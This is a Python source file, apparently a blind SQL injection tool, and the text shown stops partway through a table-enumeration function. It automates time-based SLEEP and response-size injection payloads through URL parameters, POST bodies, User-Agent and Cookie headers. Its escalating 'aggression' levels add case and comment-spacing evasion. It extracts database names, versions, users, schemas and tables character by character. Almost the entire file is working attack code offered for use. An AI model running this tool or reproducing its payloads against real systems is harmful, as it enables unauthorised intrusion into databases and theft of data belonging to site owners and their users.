#!/usr/bin/python3
import requests
import sys
from datetime import datetime
import argparse
from tabulate import tabulate

SQLI_TYPE       = ['TIME', 'ERROR']
TIME_BSD        = 0
ERROR_BSD       = 1

METHODS         = ['GET', 'POST']
GET             = 0
POST            = 1

GETMETHODS_0    = ['GETPARAM']
GETMETHODS_1    = ['GETPARAM', 'GETSTRING']
GETMETHODS_2    = ['GETPARAM', 'GETSTRING', 'GETDIRECT']
GETMETHODS_3    = ['GETPARAM', 'GETSTRING', 'GETDIRECT']
GETMETHODS      = ['GETPARAM', 'GETSTRING', 'GETDIRECT']
GET_PARAM       = 0
GET_STRING      = 1
GET_DIRECT      = 2
POSTMETHODS_0   = ['POSTDATA']
POSTMETHODS_1   = ['POSTDATA', 'USERAGENT']
POSTMETHODS_2   = ['POSTDATA', 'USERAGENT', 'COOKIEMOD']
POSTMETHODS_3   = ['POSTDATA', 'USERAGENT', 'COOKIEMOD']
POSTMETHODS     = ['POSTDATA', 'USERAGENT', 'COOKIEMOD']
POST_DATA       = 0
USER_AGENT      = 1
COOKIE_MOD      = 2

QUOTE_TYPES_0   = ['', "\'"]
QUOTE_TYPES_1	= ['', "\'", '\"']
QUOTE_TYPES_2	= ['', "\'", '\"', '\´']
QUOTE_TYPES_3	= ['', "\'", '\"', '\´', '\`']
QUOTE_TYPES     = ['', "\'", '\"', '\´', '\`']
NO_QUOTE		= 0
SINGLE_QUOTE	= 1
DOUBLE_QUOTE	= 2
TICK        	= 3
BACK_TICK   	= 4
inQuote         = QUOTE_TYPES[NO_QUOTE]

SQL_SUFFIXES_0	= ['', '#', '-- -']
SQL_SUFFIXES_1	= ['', '#', '-- -', ' AND 1=1']
SQL_SUFFIXES_2	= ['', '#', '-- -', " AND '1'='1", ' AND 1=1', ' AND {}1{}={}1']
SQL_SUFFIXES_3	= ['', '#', '-- -', " AND '1'='1", ' AND 1=1', ' AND {}1{}={}1']
SQL_SUFFIXES	= ['', '#', '-- -', " AND '1'='1", ' AND 1=1', ' AND {}1{}={}1']
SUFF_NO 		= 0
SUFF_COMMENT	= 1
SUFF_HASHTAG    = 2
SUFF_AND_c1      = 3
SUFF_AND_n1      = 4
inSqlSuffix     = SQL_SUFFIXES[SUFF_NO]

ESCAPE_AND_0    = ['AND']
ESCAPE_AND_1    = ['AND', 'and', 'anD']
ESCAPE_AND_2    = ['AND', 'and', 'And', 'anD']
ESCAPE_AND_3    = ['AND', 'and', 'anD', 'And', 'ANd', 'aND', 'AnD', 'aNd']
ESCAPE_AND      = ['AND', 'and', 'anD', 'And', 'ANd', 'aND', 'AnD', 'aNd']
ESCAPE_OR_0     = ['OR']
ESCAPE_OR_1     = ['OR', 'or']
ESCAPE_OR_2     = ['OR', 'Or']
ESCAPE_OR_3     = ['OR', 'or', 'oR', 'Or']
ESCAPE_OR       = ['OR', 'or', 'oR', 'Or']

SPACES_0        = [' ']
SPACES_1        = [' ', '+', '/**/']
SPACES_2        = [' ', '%20', '+', '/**/']
SPACES_3        = [' ', '%20', '+', '/**/']
SPACES          = [' ', '%20', '+', '/**/']
SPACE_NORMAL    = 0
SPACE_URLENC    = 1
SPACE_PLUS      = 2
SPACE_PERSTAR   = 3
SPACE_PERPLUS   = 4
inSpace         = SPACES[SPACE_NORMAL]

INFO_SCHEMAS    = ['information_schema.schemata', 'mysql.innodb_table_stats', 'sys.x$schema_flattened_keys', 'sys.schema_table_statistics']
INFO_TABLES     = ['information_schema.tables', 'mysql.innodb_table_stats', 'sys.x$schema_flattened_keys', 'sys.schema_table_statistics']
INFO_COLUMNS    = ['information_schema.columns', 'mysql.innodb_table_stats', 'sys.x$schema_flattened_keys', 'sys.schema_table_statistics']
IT_SCHEMA       = 0
IT_INNODB       = 1
IT_XSCHEMA      = 2
IT_SCH_STAT     = 3
inFromSchema    = INFO_SCHEMAS[IT_SCHEMA]
inFromTable     = INFO_TABLES[IT_SCHEMA]
inFromColumn    = INFO_COLUMNS[IT_SCHEMA]
# ALL < TRACE < DEBUG < INFO < WARN < ERROR < FATAL < OFF
#logOff = 7
#logFatal = 6
#logError = 5
#logWarn = 4
logInfo = 0
logDebug = 1
logTrace = 2
logAll = 3
logLevels = [ 'Info', 'Debug', 'Trace', 'All' ]

NrMin = 48
NrMax = 57
CrMin = 32
CrMax = 126

protVar = 'http://'
hostVar = ''
portVar = ''
urlVar = ''
urlEnd = ''
preVar = ''
restVar = ''
pURL = ''
data = ''
paramLeft = ''
paramRight = ''
sutike = ''
dbname = ''
defaultdb = ''
tablename = ''
pvUserAgentData = ''

verbVar         = logInfo #logAll
dSec            = 1
defDBt          = False
sqliType        = 0
limitSize       = 0
aggression      = 0
AGGR_LVL        = [ 'Normal (0)', 'Power (1)', 'Extreme (2)', 'Insane (3)' ]
stopAfter       = 10

method = METHODS[GET]
subMethod = GETMETHODS[0]
INFOs = []
DBs = []
tableNames = []
colNames = []
colNameList = []

szoStart = datetime.now()
appStart = datetime.now()

http_proxy  = ""
https_proxy = ""
proxyDict = {
              "http"  : http_proxy,
              "https" : https_proxy
            }
defUserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36"
useUserAgent = defUserAgent

payloadHead1 = "(SELECT 4978 FROM (SELECT(SLEEP(IF("
payloadHead2 = "(SELECT 4978 FROM (SELECT(SLEEP(IF(ascii(substr("
payloadHead11 = "' AND (SELECT 4978 FROM (SELECT(SLEEP(IF("
payloadHead21 = "' AND (SELECT 4978 FROM (SELECT(SLEEP(IF(ascii(substr("
payloadHead4 = "(select ascii(substr(" #"(select substring(@@version,1,1))='M'"
payloadTail1 = "))))YNSg)"
payloadTail4 = ")"

mode1payloadPfx_0   = ["", " ", " AND ", " OR "]
mode1payloadPfx_1   = ["", " ", " AND ", " OR ", " UNION SELECT"]
mode1payloadPfx_2   = ["", " ", " AND ", " OR ", " UNION SELECT", " OR 'x'='x' UNION SELECT"]
mode1payloadPfx_3   = ["", " ", " AND ", " OR ", " UNION SELECT", " OR 'x'='x' UNION SELECT"]
mode1payloadPfx     = ["", " ", " AND ", " OR ", " UNION SELECT", " OR 'x'='x' UNION SELECT"]
mode1payloadSuf_0   = ['']
mode1payloadSuf_1   = ['', ',null', ',null,null', ',null,null,null', ',null,null,null,null', ',null,null,null,null,null']
mode1payloadSuf     = ['', ',null', ',null,null', ',null,null,null', ',null,null,null,null', ',null,null,null,null,null'] #, ',null,null,null,null,null,null', ',null,null,null,null,null,null,null']

payloadSchema = "SELECT count(*) FROM "+inFromTable+" WHERE table_schema="

cookies = {}
headers = {}
parameters = {}

def setHeader(suti, userAgent):
    global headers
    headers = {
        'Host': hostVar,
        'Content-Length': '85',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'Origin': urlVar,
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': userAgent,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Referer': pURL,
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cookie': suti,
        'Connection': 'close'
    }
    if verbVar >= logTrace:
        print('Header: '+str(headers))

def setParam(paramV):
    global paramLeft
    global paramRight
    eqSign = paramV.find('=')
    if eqSign != -1:
        paramLeft = paramV[:eqSign]
        paramRight = paramV[eqSign+1-len(paramV):]
    else:
        paramLeft = paramV

def setPayload(pData):
    global payload_str
    global parameters
    svData = ''
    if method == 'GET':
        if subMethod == GETMETHODS[GET_PARAM] or subMethod == GETMETHODS[GET_STRING]:
            svData = paramRight+pData
            #parameters = {'option' : 'com_fields', 'view' : 'fields', 'layout' : 'modal' , 'list[fullordering]' : data}
            parameters = {paramLeft : svData}
            payload_str = "&".join("%s=%s" % (k,v) for k,v in parameters.items())
            logki(logAll,payload_str)
        else:
            payload_str = preVar+pData
    if method == 'POST':
        if subMethod == POSTMETHODS[USER_AGENT]:
            payload_str = useUserAgent+preVar+pData+restVar
            logki(logAll,payload_str)
            setHeader(sutike, payload_str)
            svData = pvUserAgentData
        elif subMethod == POSTMETHODS[COOKIE_MOD]:
            payload_str = sutike+preVar+pData+restVar
            logki(logAll,payload_str)
            setHeader(payload_str, useUserAgent)
            svData = pvUserAgentData
        else:
            svData = preVar+pData
            svData = svData.replace(' ', inSpace)
            svData = svData+restVar
            logki(logAll,"svData: "+svData)
    return svData

def digitFind_sqliType(forWhat):
    global payload_str
    global parameters
    parameters = {}
    logki(logTrace,"[digitFind_sqliType]")
    result = 0
    for y in range(0,3+1):
        hatv = 10 ** y
        data = ''
        if sqliType == 0:
            data = payloadHead1+"("+forWhat+")<"+str(hatv)+","+str(dSec)+",0"+payloadTail1
        elif sqliType == 1:
            data = "(("+forWhat+")<"+str(hatv)+payloadTail4
        data = setPayload(data)
        tstart = datetime.now()
        if method == 'GET':
            dUrl = pURL
            if subMethod == GETMETHODS[GET_DIRECT]:
                dUrl = pURL + payload_str
                logki(logAll,dUrl)
            if subMethod == GETMETHODS[GET_PARAM] or subMethod == GETMETHODS[GET_DIRECT]:
                response = requests.get(dUrl, params=parameters)
            if subMethod == GETMETHODS[GET_STRING]:
                response = requests.get(dUrl, params=payload_str)
        if method == 'POST':
            response = requests.post(pURL, proxies=proxyDict, headers=headers, cookies=cookies, data=data, verify=False)
        tend = datetime.now()
        logki(logTrace,response.url)
        delta = tend - tstart
        tdelta = int(delta.total_seconds() * 1000 )
        rSize = len(response.content)
        logki(logTrace,"RespSize: "+str(rSize)+"kb Resp: "+str(response.elapsed.total_seconds())+"s Calc:"+str(tdelta/1000)+"s - Limit: "+str(dSec)+"s")
        if (sqliType == 0) and ((response.elapsed.total_seconds() >= dSec) or (tdelta >= dSec*1000)):
            result = y
            break
        elif (sqliType == 1) and (rSize > limitSize):
            result = y
            break
    return result

def lenFind_sqliType(forWhat):
    global payload_str
    global parameters
    parameters = {}
    result = '0'
    digN = digitFind_sqliType(forWhat)
    logki(logTrace,"[lenFind_sqliType]")
    logki(logTrace,"Digits: "+str(digN))
    for y in range(1,digN+1):
        for x in range(NrMin,NrMax+1):
            if sqliType == 0:
                data = payloadHead2+"("+forWhat+"),"+str(y)+",1))<>"+str(x)+",0,"+str(dSec)+payloadTail1
            elif sqliType == 1:
                data = payloadHead4+"("+forWhat+"),"+str(y)+",1))="+str(x)+payloadTail4
            data = setPayload(data)
            tstart = datetime.now()
            if method == 'GET':
                dUrl = pURL
                if subMethod == GETMETHODS[GET_DIRECT]:
                    dUrl = pURL + payload_str
                    logki(logAll,dUrl)
                if subMethod == GETMETHODS[GET_PARAM] or subMethod == GETMETHODS[GET_DIRECT]:
                    response = requests.get(dUrl, params=parameters)
                if subMethod == GETMETHODS[GET_STRING]:
                    response = requests.get(dUrl, params=payload_str)
            if method == 'POST':
                response = requests.post(pURL, proxies=proxyDict, headers=headers, cookies=cookies, data=data, verify=False)
            tend = datetime.now()
            logki(logTrace,response.url)
            delta = tend - tstart
            tdelta = int(delta.total_seconds() * 1000 )
            rSize = len(response.content)
            logki(logTrace,"RespSize: "+str(rSize)+"kb Resp: "+str(response.elapsed.total_seconds())+"s Calc:"+str(tdelta/1000)+"s - Limit: "+str(dSec)+"s")
            if (sqliType == 0) and ((response.elapsed.total_seconds() >= dSec) or (tdelta >= dSec*1000)):
                result = result + chr(x)
                break
            elif (sqliType == 1) and (rSize > limitSize):
                result = result + chr(x)
                break
    return result

def testRun():
    global subMethod
    global sutike
    global payload_str
    payload_str = ""
    subMethod = 'tests...'
    runparams()
    response = ''
    tries = 0
    payloadParams = []
    logki(logTrace,"[testRun]")
    result = False
    if aggression == 1:
        USE_ESC_OR = ESCAPE_OR_1
        USE_ESC_AND = ESCAPE_AND_1
        USE_MPS = mode1payloadSuf_0
        USE_SUFFIXES = SQL_SUFFIXES_1
        USE_Q_TYP = QUOTE_TYPES_1
        USE_MPP = mode1payloadPfx_1
        USE_GE_ME = GETMETHODS_1
        USE_PO_ME = POSTMETHODS_1
        USE_SPACES = SPACES_1
    elif aggression == 2:
        USE_ESC_OR = ESCAPE_OR_2
        USE_ESC_AND = ESCAPE_AND_2
        USE_MPS = mode1payloadSuf_1
        USE_SUFFIXES = SQL_SUFFIXES_2
        USE_Q_TYP = QUOTE_TYPES_2
        USE_MPP = mode1payloadPfx_2
        USE_GE_ME = GETMETHODS_2
        USE_PO_ME = POSTMETHODS_2
        USE_SPACES = SPACES_2
    elif aggression == 3:
        USE_ESC_OR = ESCAPE_OR_3
        USE_ESC_AND = ESCAPE_AND_3
        USE_MPS = mode1payloadSuf_1
        USE_SUFFIXES = SQL_SUFFIXES_3
        USE_Q_TYP = QUOTE_TYPES_3
        USE_MPP = mode1payloadPfx_3
        USE_GE_ME = GETMETHODS_3
        USE_PO_ME = POSTMETHODS_3
        USE_SPACES = SPACES_3
    else:
        USE_ESC_OR = ESCAPE_OR_0
        USE_ESC_AND = ESCAPE_AND_0
        USE_MPS = mode1payloadSuf_0
        USE_SUFFIXES = SQL_SUFFIXES_0
        USE_Q_TYP = QUOTE_TYPES_0
        USE_MPP = mode1payloadPfx_0
        USE_GE_ME = GETMETHODS_0
        USE_PO_ME = POSTMETHODS_0
        USE_SPACES = SPACES_0
    findN = 0
    mszer = 1
    if method == 'GET':
        mszer = len(USE_GE_ME)
    if method == 'POST':
        mszer = len(USE_PO_ME)
    if verbVar >= logDebug:
        print('Use get sm   : ')
        print(USE_GE_ME)
        print('Use post sm  : ')
        print(USE_PO_ME)
        print('Esc OR       : ')
        print(USE_ESC_OR)
        print('Esc AND      : ')
        print(USE_ESC_AND)
        print('Esc spcaes   : ')
        print(USE_SPACES)
        print('Use quotes   : ')
        print(USE_Q_TYP)
        print('Use pl pfx   : ')
        print(USE_MPP)
        print('Use pl sfx   : ')
        print(USE_MPS)
        print('Use sql sfx  : ')
        print(USE_SUFFIXES)
        runparams()
    #keyboard.add_hotkey('q', lambda: keyStroke('Q'))
    #keyboard.add_hotkey('Q', lambda: keyStroke('Q'))
    allTries = mszer * len(USE_MPP) * len(USE_MPS) * len(USE_Q_TYP) * len(SPACES) * len(USE_SUFFIXES) * len(USE_ESC_OR) * len(USE_ESC_AND)
    for gethdik in range(0, mszer):
        if result: break
        if method == 'GET':
            subMethod = GETMETHODS[gethdik]
        if method == 'POST':
            subMethod = POSTMETHODS[gethdik]
        #logki(logInfo,'[hdik] - ['+str(gethdik)+']')
        for escOR in USE_ESC_OR:
            if result: break
            for escAND in USE_ESC_AND:
                if result: break
                for sufF in USE_SUFFIXES:
                    if result: break
                    #logki(logInfo,'[mpS] - ['+str(mpS)+']')
                    for spcF in SPACES:
                        if result: break
                        #logki(logInfo,'[qt] - ['+str(qt)+']')
                        for qt in USE_Q_TYP:
                            if result: break
                            #logki(logInfo,'[spcF] - ['+str(spcF)+']')
                            for mpS in USE_MPS:
                                if result: break
                                #logki(logInfo,'[sufF] - ['+str(sufF)+']')
                                for mpP in USE_MPP:
                                    tries += 1
                                    payloadFinding = []
                                    mpPv = mpP.replace('OR', escOR)
                                    mpPv = mpPv.replace('AND', escAND)
                                    mpPv = mpPv.replace(' ', spcF)
                                    sufFv = sufF.replace(' ', spcF)
                                    if mpS == '':
                                        data = qt+mpPv+"(SELECT 4978 FROM (SELECT(SLEEP("+str(dSec)+")))YNSg)"+sufFv
                                    else:
                                        data = qt+mpPv+" (SLEEP("+str(dSec)+"))"+mpS+sufFv
                                    data = data.replace('OR', escOR)
                                    data = data.replace('AND', escAND)
                                    data = data.replace(' ', spcF)
                                    if method == 'GET':
                                        #logki(logAll,data)
                                        data = paramRight+data+restVar
                                        parameters = {paramLeft : data}
                                        #parameters = {'option' : 'com_fields', 'view' : 'fields', 'layout' : 'modal' , 'list[fullordering]' : data}
                                        payload_str = "&".join("%s=%s" % (k,v) for k,v in parameters.items())
                                        #logki(logAll,payload_str)
                                    if method == 'POST':
                                        if subMethod == POSTMETHODS[USER_AGENT]:
                                            payload_str = useUserAgent+data
                                            setHeader(sutike, payload_str)
                                            data = preVar + restVar
                                        elif subMethod == POSTMETHODS[COOKIE_MOD]:
                                            if sutike == '' or sutike[0] == ' ':
                                                sutike = 'C' + sutike
                                            payload_str = sutike+data
                                            setHeader(payload_str, useUserAgent)
                                            data = preVar + restVar
                                        else:
                                            data = preVar+data
                                            data = data+restVar
                                            payload_str = data
                                    logki(logTrace,"data       : "+data)
                                    logki(logTrace,"payload_str: "+payload_str)
                                    tstart = datetime.now()
                                    if method == 'GET':
                                        if gethdik == 0:
                                            response = requests.get(pURL, params=parameters)
                                        elif gethdik == 1:
                                            response = requests.get(pURL, params=payload_str)
                                        else:
                                            parameters = {}
                                            payload_str = data
                                            dUrl = pURL + payload_str
                                            logki(logAll,dUrl)
                                            response = requests.get(dUrl, params=parameters)
                                    if method == 'POST':
                                        if subMethod == POSTMETHODS[USER_AGENT] or subMethod == POSTMETHODS[COOKIE_MOD]:
                                            logki(logAll,pvUserAgentData)
                                            response = requests.post(pURL, proxies=proxyDict, headers=headers, cookies=cookies, data=pvUserAgentData, verify=False)
                                        else:
                                            response = requests.post(pURL, proxies=proxyDict, headers=headers, cookies=cookies, data=data, verify=False)
                                    logki(logTrace,response.url)
                                    tend = datetime.now()
                                    delta = tend - tstart
                                    tdelta = int(delta.total_seconds() * 1000 )
                                    logki(logAll,"Resp: "+str(response.elapsed.total_seconds())+"s Calc:"+str(tdelta/1000)+"s - Limit: "+str(dSec)+"s")
                                    sys.stdout.write("[ Round "+str(gethdik+1)+" / "+str(mszer)+" ["+subMethod+"] - Try #"+str(tries)+" / "+str(allTries)+" - Hit "+str(findN)+" ]\r") # - Press 'q' to stop
                                    sys.stdout.flush()
                                    if (response.elapsed.total_seconds() >= dSec) or (tdelta >= dSec*1000):
                                        findN += 1
                                        sys.stdout.write("[ Round "+str(gethdik+1)+" / "+str(mszer)+" ["+subMethod+"] - Try #"+str(tries)+" / "+str(allTries)+" - Hit "+str(findN)+" ]\r") # - Press 'q' to stop
                                        sys.stdout.flush()
                                        payloadFinding.append(str(findN))
                                        payloadFinding.append(subMethod+" ("+str(gethdik)+")")
                                        payloadFinding.append('['+qt+mpPv+']')
                                        #payloadFinding.append('['+mpP+']')
                                        payloadFinding.append('['+spcF+']')
                                        payloadFinding.append('['+mpS+']')
                                        payloadFinding.append('['+sufFv+']')
                                        payloadFinding.append(payload_str)
                                        payloadParams.append(payloadFinding)
                                        logki(logTrace,'[hdik] - ['+str(gethdik+1)+']'+' '*40)
                                        logki(logTrace,'[qt]   - ['+qt+']')
                                        logki(logTrace,'[mpP]  - ['+mpPv+']')
                                        logki(logTrace,'[spcF] - ['+spcF+']')
                                        logki(logTrace,'[mpS]  - ['+mpS+']')
                                        logki(logTrace,'[sufF] - ['+sufFv+']')
                                        logki(logTrace,'--------------------------------')
                                        if findN >= stopAfter: result = True
                                        if result: break
                                        #break
    print("")
    print('---')
    print('Tries: '+str(tries)+' - url: '+pURL)
    if len(payloadParams):
        print('---')
        print('!Attack vector(s) found: '+str(findN)+'!')
        #print(payloadParams)
        print(tabulate(payloadParams, headers=['#','-sm(ethod)','-ph(ead)','-sp(ace)','cNulls','-pt(ail)','payload'], tablefmt='orgtbl'))
        print('---')
    else:
        print('+------------------+')
        print('|  Not found. :-(  |')
        print('+------------------+')
    return result

def charFind_sqliType(forWhat, whatLen):
    global payload_str
    global parameters
    parameters = {}
    logki(logTrace,"[charFind_sqliType]")
    result = ''
    dispDeltaStart('szo')
    for y in range(1,whatLen + 1):
        rangeMin = CrMin
        rangeMax = CrMax
        x = 0
        cv = True
        while cv:
            ex = x
            x = int(rangeMin + ((rangeMax - rangeMin) / 2))
            data = ''
            logki(logAll,"calc: "+str(rangeMin)+" - "+str(x)+" - "+str(rangeMax))
            if sqliType == 0:
                #data = payloadHead2+"("+forWhat+"),"+str(y)+",1))>"+str(x)+",0,"+str(dSec)+payloadTail1
                data = payloadHead2+"("+forWhat+"),"+str(y)+",1))>"+str(x)+","+str(dSec)+",0"+payloadTail1
            elif sqliType == 1:
                data = payloadHead4+"("+forWhat+"),"+str(y)+",1))>"+str(x)+payloadTail4
            data = setPayload(data)
            tstart = datetime.now()
            if method == 'GET':
                dUrl = pURL
                if subMethod == GETMETHODS[GET_DIRECT]:
                    dUrl = pURL + payload_str
                    logki(logAll,dUrl)
                if subMethod == GETMETHODS[GET_PARAM] or subMethod == GETMETHODS[GET_DIRECT]:
                    response = requests.get(dUrl, params=parameters)
                if subMethod == GETMETHODS[GET_STRING]:
                    response = requests.get(dUrl, params=payload_str)
            if method == 'POST':
                response = requests.post(pURL, proxies=proxyDict, headers=headers, cookies=cookies, data=data, verify=False)
            tend = datetime.now()
            logki(logTrace,response.url)
            delta = tend - tstart
            tdelta = int(delta.total_seconds() * 1000 )
            rSize = len(response.content)
            logki(logTrace,"RespSize: "+str(rSize)+"kb Resp: "+str(response.elapsed.total_seconds())+"s Calc:"+str(tdelta/1000)+"s - Limit: "+str(dSec)+"s")
            if sqliType == 0:
                if (response.elapsed.total_seconds() >= dSec) or (tdelta >= dSec*1000):
                    rangeMin = x
                    logki(logAll,"x --> rMin: "+str(x))
                else:
                    rangeMax = x
                    logki(logAll,"x --> rMax: "+str(x))
            elif sqliType == 1:
                if rSize > limitSize:
                    rangeMin = x
                    logki(logAll,"x --> rMin: "+str(x))
                else:
                    rangeMax = x
                    logki(logAll,"x --> rMax: "+str(x))
            if rangeMax - rangeMin <= 3:
                for f in range(rangeMin-1,rangeMax+1):
                    logki(logAll,"calcBL: "+str(rangeMin)+" - "+str(f)+" - "+str(rangeMax))
                    if sqliType == 0:
                        data = payloadHead2+"("+forWhat+"),"+str(y)+",1))<>"+str(f)+",0,"+str(dSec)+payloadTail1
                    elif sqliType == 1:
                        data = payloadHead4+"("+forWhat+"),"+str(y)+",1))="+str(f)+payloadTail4
                    data = setPayload(data)
                    tstart = datetime.now()
                    if method == 'GET':
                        dUrl = pURL
                        if subMethod == GETMETHODS[GET_DIRECT]:
                            dUrl = pURL + payload_str
                            logki(logAll,dUrl)
                        if subMethod == GETMETHODS[GET_PARAM] or subMethod == GETMETHODS[GET_DIRECT]:
                            response = requests.get(dUrl, params=parameters)
                        if subMethod == GETMETHODS[GET_STRING]:
                            response = requests.get(dUrl, params=payload_str)
                    if method == 'POST':
                        response = requests.post(pURL, proxies=proxyDict, headers=headers, cookies=cookies, data=data, verify=False)
                    tend = datetime.now()
                    logki(logTrace,response.url)
                    delta = tend - tstart
                    tdelta = int(delta.total_seconds() * 1000 )
                    rSize = len(response.content)
                    logki(logTrace,"RespSize: "+str(rSize)+"kb Resp: "+str(response.elapsed.total_seconds())+"s Calc:"+str(tdelta/1000)+"s - Limit: "+str(dSec)+"s")
                    melyikAg = False
                    if sqliType == 0:
                        if (response.elapsed.total_seconds() >= dSec) or (tdelta >= dSec*1000):
                            melyikAg = True
                    elif sqliType == 1:
                        if rSize > limitSize:
                            melyikAg = True
                    if melyikAg:
                        x = f
                        logki(logAll,"calcBI: "+str(rangeMin)+" - "+str(f)+" - "+str(rangeMax))
                        result = result + chr(x)
                        cv = False
                        logki(logDebug,"Result: "+result)
                        break
                    else:
                        if ((rangeMax == CrMin) and (rangeMin == CrMin)) or ((rangeMax == CrMax) and (rangeMin == CrMax)):
                            cv = False
                            break
    dispDeltaStop('szo')
    return result

def charFind4(forWhat, whatLen, mitKeres):
    global dSec
    global method
    global pURL
    global inSpace
    logki(logTrace,"[charFind4]")
    result = ''
    step = -1
    rangeMin = CrMax
    rangeMax = CrMin
    relaciosJel = '='
    dispDeltaStart('szo')
    for y in range(1,whatLen+1):
        for x in range(rangeMin, rangeMax+1, step):
            data = payloadHead4+"("+forWhat+"),"+str(y)+",1))"+relaciosJel+str(x)+payloadTail4
            if method == 'GET':
                data = paramRight+data
                parameters = {paramLeft : data}
                payload_str = "&".join("%s=%s" % (k,v) for k,v in parameters.items())
                logki(logAll,payload_str)
            if method == 'POST':
                data = preVar+data
                data = data.replace(' ', inSpace)
                data = data+restVar
                logki(logAll,data)
            tstart = datetime.now()
            if method == 'GET':
                response = requests.get(pURL, params=parameters) #payload_str)
            if method == 'POST':
                response = requests.post(pURL, proxies=proxyDict, headers=headers, cookies=cookies, data=data, verify=False)
            logki(logTrace,response.url)
            rSize = len(response.content)
            #logki(logAll,"Resp: "+str(response.elapsed.total_seconds())+"s Calc:"+str(tdelta/1000)+"s - Limit: "+str(dSec)+"s")
            logki(logTrace,"RespSize: "+str(rSize)+"kb")
            if (rSize > 8000):
                #logki(logAll,data)
                result = result + chr(x)
                logki(logDebug,"Result: "+result)
                break
    if result == '':
        result = '0'
    dispDeltaStop('szo')
    return result

def charFind3(forWhat, whatLen, mitKeres):
    global dSec
    global method
    global pURL
    global inSpace
    logki(logTrace,"[charFind3]")
    result = ''
    step = -1
    rangeMin = CrMax
    rangeMax = CrMin
    relaciosJel = '<'
    if mitKeres == 'A':
        step = 1
        rangeMin = CrMin
        rangeMax = CrMax
        relaciosJel = '>'
    if mitKeres == '1':
        step = 1
        rangeMin = NrMin
        rangeMax = NrMax
        relaciosJel = '>'
    dispDeltaStart('szo')
    for y in range(1,whatLen+1):
        for x in range(rangeMin, rangeMax+1, step):
            data = payloadHead2+"("+forWhat+"),"+str(y)+",1))"+relaciosJel+str(x)+",0,"+str(dSec)+payloadTail1
            if method == 'GET':
                #parameters = {'option' : 'com_fields', 'view' : 'fields', 'layout' : 'modal' , 'list[fullordering]' : data}
                data = paramRight+data
                parameters = {paramLeft : data}
                payload_str = "&".join("%s=%s" % (k,v) for k,v in parameters.items())
                logki(logAll,payload_str)
            if method == 'POST':
                data = preVar+data
                data = data.replace(' ', inSpace)
                data = data+restVar
                logki(logAll,data)
            tstart = datetime.now()
            if method == 'GET':
                response = requests.get(pURL, params=parameters) #payload_str)
            if method == 'POST':
                response = requests.post(pURL, proxies=proxyDict, headers=headers, cookies=cookies, data=data, verify=False)
            logki(logTrace,response.url)
            tend = datetime.now()
            delta = tend - tstart
            tdelta = int(delta.total_seconds() * 1000 )
            logki(logAll,"Resp: "+str(response.elapsed.total_seconds())+"s Calc:"+str(tdelta/1000)+"s - Limit: "+str(dSec)+"s")
            if (response.elapsed.total_seconds() >= dSec) or (tdelta >= dSec*1000):
                #logki(logAll,data)
                result = result + chr(x)
                logki(logDebug,"Result: "+result)
                break
    if result == '':
        result = '0'
    dispDeltaStop('szo')
    return result

def dispDeltaStart(mi):
    global szoStart
    global appStart
    if mi == 'szo':
        szoStart = datetime.now()
    if mi == 'app':
        appStart = datetime.now()

def dispDeltaStop(mi):
    global szoStart
    global appStart
    if mi == 'szo':
        szoEnd = datetime.now()
        szoDelta = szoEnd - szoStart
        logki(logDebug,"Subtotal cost: "+str(szoDelta)+"s")
    if mi == 'app':
        appEnd = datetime.now()
        appDelta = appEnd - appStart
        logki(logDebug,"Total cost: "+str(appDelta)+"s")

def logki(mikorki,amitki):
    global verbVar
    if verbVar >= mikorki:
        print("["+logLevels[mikorki]+"] - "+amitki)

def progress(mikorki,what, cur, sum):
    global verbVar
    if verbVar >= mikorki:
        print("["+logLevels[mikorki]+"] - "+what+" progress: "+str(cur)+"/"+str(sum))

def db_alap_q(roundS,desc,query,rest,limites):
    global defaultdb
    global inSpace
    for os in range(0,roundS):
        progress(logDebug,desc,os+1,roundS)
        restValue = rest
        if limites:
            if query == "table_name":
                if defDBt:
                    restValue = restValue+" WHERE table_schema="+dbname+""
                else:
                    restValue = restValue+" WHERE table_schema='"+dbname+"'"
            restValue = restValue+" LIMIT "+str(os)+",1"
        iresS = lenFind_sqliType("SELECT length("+query+")"+restValue)
        logki(logTrace,desc+' string hossz: '+iresS)
        iresN = int(iresS)
        iresS = charFind_sqliType("SELECT "+query+restValue, iresN)
        logki(logDebug,desc+': '+iresS)
        if query == "schema_name":
            DBs.append([iresS])
        if query == "database()":
            defaultdb = iresS
            INFOs.append([desc, iresS])
        if (query == "user()") or (query == "system_user()") or (query == "version()"):
            INFOs.append([desc, iresS])
        if query == "table_name":
            tableNames.append([iresS])
        if query == "column_name":
            colNames.append(iresS)
            colNameList.append([iresS])
    return

def info_q():
    #global defaultdb
    print(' --< Info query ]--[ ')
    runparams()
#infolekérdezséek
    db_alap_q(1,"Default DB","database()","",False)
    db_alap_q(1,"DB version","version()","",False)
    db_alap_q(1,"DB user","user()","",False)
    db_alap_q(1,"DB system user","system_user()","",False)
    print('---')
    print('Info(s)')
    print(tabulate(INFOs, headers=['Function', 'value'], tablefmt='orgtbl'))
    print('---')

def schema_q():
    #global defaultdb
    #global inSpace
    print(' --< Schema query ]--[ ')
    runparams()
#schema/db lekrdezések
    schemaN = 0
    resS = '0'
    resS = lenFind_sqliType("SELECT count(*) FROM "+inFromSchema)
    logki(logInfo,'Schema(s) num: '+resS)
    schemaN = int(resS)
    db_alap_q(schemaN,"Schema(s)","schema_name"," FROM "+inFromSchema,True)
    print('---')
    print("Schema(s):")
    print(tabulate(DBs, headers=['schema_name'], tablefmt='orgtbl'))
    print('---')

def table_q(): #tábla lekrdezések
    global dbname
    global defaultdb
    #global defDBt
    #global inSpace
    print(' --< DB query ]--[ ')
    runparams()
    print("Database      ["+dbname+"]")
    if defDBt:
        defaultdb = dbname
        dbname = "database()"
        print("Defult DB    : "+dbname)
        #db_alap_q(1,"Default DB","database()","",False)
    resS = '0'
    if defDBt:
        resS = lenFind_sqliType(payloadSchema+dbname)
    else:
        resS = lenFind_sqliType(payloadSchema+"'"+dbname+"'")
    if resS == '0':
        resS = lenFind_sqliType(payloadSchema+"'"+defaultdb+"'")
    logki(logInfo,'Table(s) num: '+resS)
    tableN = int(resS)
    #tableN = 2
